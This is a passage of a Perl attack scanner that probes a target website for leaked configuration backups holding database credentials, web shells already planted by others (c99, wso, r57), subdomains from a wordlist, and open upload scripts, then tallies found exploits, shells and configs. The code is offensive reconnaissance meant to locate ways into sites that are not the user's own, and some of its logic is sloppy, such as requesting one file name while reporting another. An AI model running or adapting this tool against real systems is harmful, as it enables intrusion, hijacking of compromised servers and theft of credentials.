@cnconfigs = ('configuration.php' , 'configuration.php~' , 'configuration.php.new' , 'configuration.php.new~' , 'config.php~','config.php.new','config.php.new~','config.php.old','config.php.old~','config.bak','config.php.bak','config.php.bkp','config.txt','config.php.txt','config - Copy.php');
foreach $cnconfig(@cnconfigs){
    $sourcsse=$ou->get("$url/$cnconfig")->decoded_content;
    if(head("$url/$config") and $sourcsse =~ m/DB_NAME/i || $sourcsse =~ m/define/i || $sourcsse =~ m/\'\)\;/i || $sourcsse =~ m/\"\)\;/i){
    	print color("yellow") . "\a    - Config File Path : $url/includes/$cnconfig\n" . color("reset");
    	$ccnum = $ccnum + 1;
    }
}
if ("$ccnum" eq "0"){
	print color("on_red") . "      [-] Not Found Any Config File !!\n" . color("reset");
}

}elsif ("$conreq" eq "n" or "$conreq" eq "N" or "$conreq" eq "no" or "$conreq" eq "No" or "$conreq" eq "NO" or "$conreq" eq "nO"){
		$conreqq = "Yes";
	print "\n";
	}else{
		print color("on_red") . "      [-] Command '$conreq' Not Found !!\n" . color("reset");
		$conreqq = "No";
	}
}


# Shell Finder Request ^_^
my $scnum = "0";
my $shreqq = "No";
while ("$shreqq" eq "No"){
print color("cyan") . "\n  [~] Do You Want To Start Shell-Finder ? [Y/n] : " . color("reset");
my $shreq = <STDIN>;
chomp($shreq);
if ("$shreq" eq "y" or "$shreq" eq "Y" or "$shreq" eq "Yes" or "$shreq" eq "yes" or "$shreq" eq "YES" or "$shreq" eq ""){
	$shreqq = "Yes";
@shells = ('c99.php' , '.c99.php' , 'wos.php' , 'wso.php' , '.wos.php' , '.wso.php' , '.r57.php' , 'r57.php' , 'sql.php' , '.sql.php' , 'shell.php' , '.shell.php');
foreach $shell(@shells){
    if(head("$url/$shell")){
    	print color("yellow") . "\a    - Shell File Path : $url/$shell\n" . color("reset");
    	$scnum = $scnum + 1;
    }
}
if ("$scnum" eq "0"){
	print color("on_red") . "      [-] Not Found Any Shell File !!\n" . color("reset");
}

}elsif ("$shreq" eq "n" or "$shreq" eq "N" or "$shreq" eq "no" or "$shreq" eq "No" or "$shreq" eq "NO" or "$shreq" eq "nO"){
		$shreqq = "Yes";
	print "\n";
	}else{
		print color("on_red") . "      [-] Command '$shreq' Not Found !!\n" . color("reset");
		$shreqq = "No";
	}
}





# Subdomain Finder Request ^_^
my $bsubnum = "0";
my $subreqq = "No";
if ("$url" =~ "https://"){
	$url2 = substr($url, 8);
	if ("$url2" =~ "www"){
	$urlf = substr($url2, 4);
	}else{
	$urlf = substr($url, 8);
	}
}elsif ("$url" =~ "http://"){
	$url2 = substr($url, 7);
	if ("$url2" =~ "www"){
	$urlf = substr($url2, 4);
	}else{
	$urlf = substr($url, 7);
	}
}
while ("$subreqq" eq "No"){
print color("cyan") . "\n  [~] Do You Want To Start Subdomain-Finder ? [Y/n] : " . color("reset");
my $subreq = <STDIN>;
chomp($subreq);
if ("$subreq" eq "y" or "$subreq" eq "Y" or "$subreq" eq "Yes" or "$subreq" eq "yes" or "$subreq" eq "YES" or "$subreq" eq ""){
	$subreqq = "Yes";
@subconfigs = ("www." , "about.", "abose.", "acme.", "ad.", "admanager.", "admin.", "admins.", "administrador.", "administrateur.", "administrator.", "ads.", "adsense.", "adult.", "adwords.", "affiliate.", "affiliatepage.", "afp.", "analytics.", "android.", "shop.", "echop.", "blog.", "tienda.", "answer.", "ap.", "api.", "apis.", "app.", "bank.", "blogs.", "client.", "clients.", "community.", "content.", "cpanel.", "dashbord.", "data.", "developer.", "developers.", "dl.", "docs.", "documents.", "download.", "downloads.", "encrypted.", "email.", "webmail.", "mail.", "correo.", "ftp.", "forum.", "forums.", "feed.", "feeds.", "file.", "files.", "gov.", "home.", "help.", "invoice.", "invoises.", "items.", "js.", "es.", "it.", "en.", "fr.", "ar.", "legal.", "iphone.", "lab.", "labs.", "list.", "lists.", "log.", "logs.", "errors.", "net.", "mysql.", "mysqldomain.", "net.", "network.", "news.", "ns.", "ns1.", "ns2.", "ns3.", "ns4.", "ns5.", "org.", "panel.", "partner.", "partners.", "pop.", "pop3.", "private.", "proxies.", "public.", "reports.", "root.", "rss.", "prod.", "prods.", "sandbox.", "search.", "server.", "servers.", "signin.", "signup.", "login.", "smtp.", "srntp.", "ssl.", "soap.", "stat.", "statics.", "store.", "status.", "survey.", "sync.", "system.", "text.", "test.", "webadmin.", "webdisk.", "xhtml.", "xhtrnl.", "xml.");
print "\n";
foreach my $subdodo (@subconfigs){
	my $srt = $ou->get('http://' . "$subdodo$urlf")->decoded_content;
    if (head('http://' . "$subdodo$urlf")) {
    	if ("$srt" =~ "Access denied." or "$srt" =~ "404 Not Found"){
    		my $rjdskhfg = "dfgjshd";
    		}else{
    print color("yellow") . "\a    - Subdomain Found : $subdodo$urlf\n" . color("reset");
    $bsubnum = $bsubnum + 1;
}
    }
}
if ("$bsubnum" eq "0"){
	print color("on_red") . "      [-] Not Found Any Subdomain !!\n" . color("reset");
}
}elsif ("$subreq" eq "n" or "$subreq" eq "N" or "$subreq" eq "no" or "$subreq" eq "No" or "$subreq" eq "NO" or "$subreq" eq "nO"){
		$subreqq = "Yes";
	print "\n";
	}else{
		print color("on_red") . "      [-] Command '$subreq' Not Found !!\n" . color("reset");
		$subreqq = "No";
	}
}








# Upload Files Finder Request ^_^
my $supum = "0";
my $supupreqq = "No";
while ("$supupreqq" eq "No"){
print color("cyan") . "\n  [~] Do You Want To Start Shell-Finder ? [Y/n] : " . color("reset");
my $suprreq = <STDIN>;
chomp($suprreq);
if ("$suprreq" eq "y" or "$suprreq" eq "Y" or "$suprreq" eq "Yes" or "$suprreq" eq "yes" or "$suprreq" eq "YES" or "$suprreq" eq ""){
	$supupreqq = "Yes";
@uploadsp = ("/up.php", "/up1.php", "up/up.php", "/site/up.php", "/vb/up.php", "/forum/up.php", "/blog/up.php", "/upload.php", "/upload1.php", "/upload2.php", "/vb/upload.php", "/forum/upload.php", "blog/upload.php", "site/upload.php", "download.php");
foreach $ups(@uploadsp){
    if(head("$url/$ups")){
    	print color("yellow") . "\a    - Upload File Path : $url/$ups\n" . color("reset");
    	$supum = $supum + 1;
    }
}
if ("$supum" eq "0"){
	print color("on_red") . "      [-] Not Found Any Upload File !!\n" . color("reset");
}

}elsif ("$suprreq" eq "n" or "$suprreq" eq "N" or "$suprreq" eq "no" or "$suprreq" eq "No" or "$suprreq" eq "NO" or "$suprreq" eq "nO"){
		$supupreqq = "Yes";
	print "\n";
	}else{
		print color("on_red") . "      [-] Command '$suprreq' Not Found !!\n" . color("reset");
		$supupreqq = "No";
	}
}







if ("$vnum" eq "0"){
	print color("yellow") , "\n  [!] Exploit Tested : $nvnum\n" , color("reset");
	print color("on_red") , "  [-] Sorry Not Exploit Found." , color("reset");
}else{
	print color("yellow") , "\n  [!] Exploit Tested : $nvnum\n" , color("reset");
	print color("yellow") , "  [!] Exploit Found  : $vnum\n" , color("reset");
}
if ("$scnum" ne "0"){
	print color("yellow") . "  [-] Shell Found : $scnum\n" . color("reset");
}

if ("$ccnum" ne "0"){
	print color("yellow") . "  [-] Config Found : $ccnum\n" . color("reset");
}

if ("$bbnum" ne "0"){
	print color("yellow") . "  [-] Backup Found : $bbnum\n" . color("reset");
}

if ("$bsubnum" ne "0"){
	print color("yellow") . "  [-] Subdomain Found : $bsubnum\n" . color("reset");
}


if ("$supum" ne "0"){
	print color("yellow") . "  [-] Upload Found : $supum\n" . color("reset");
}


return 1;
